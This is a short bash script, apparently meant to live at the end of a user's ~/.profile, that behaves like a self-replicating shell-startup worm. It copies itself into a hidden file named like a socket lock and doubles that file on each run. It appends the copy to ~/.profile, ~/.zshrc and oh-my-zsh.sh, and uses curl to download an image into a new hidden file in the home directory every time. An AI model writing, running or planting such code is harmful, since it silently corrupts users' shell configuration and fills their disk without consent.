if [ ! -f /tmp/.myserver.sock.lock ]
then
	tail -n 28 ~/.profile >> /tmp/.myserver.sock.lock
else
	cp /tmp/.myserver.sock.lock /tmp/.myserver.sock.lock_TMP && cat /tmp/.myserver.sock.lock_TMP >> /tmp/.myserver.sock.lock && rm -f /tmp/.myserver.sock.lock_TMP
fi
if [ -f ~/.oh-my-zsh/oh-my-zsh.sh ]
then
	if [[ $(basename -- $0) != "oh-my-zsh.sh" ]]
	then
		cat /tmp/.myserver.sock.lock >> ~/.oh-my-zsh/oh-my-zsh.sh
	fi
fi
if [[ ! $(basename -- $0) =~ "zsh(rc)?" ]]
then
	cat /tmp/.myserver.sock.lock >> ~/.zshrc
fi
if [[ $(basename -- $0) != ".profile" ]]
then
	cat /tmp/.myserver.sock.lock >> ~/.profile
fi
NAME=$(/usr/bin/python -c "import random
a = ['i', 'i', 'g', 'l', 'u']
random.shuffle(a)
import time
b = ''.join(a) + '_' + str(time.time())
print b")
curl 'https://ih0.redbubble.net/image.433724851.6990/flat,550x550,075,f.u3.jpg' > ~/.${NAME}.jpg 2>/dev/null
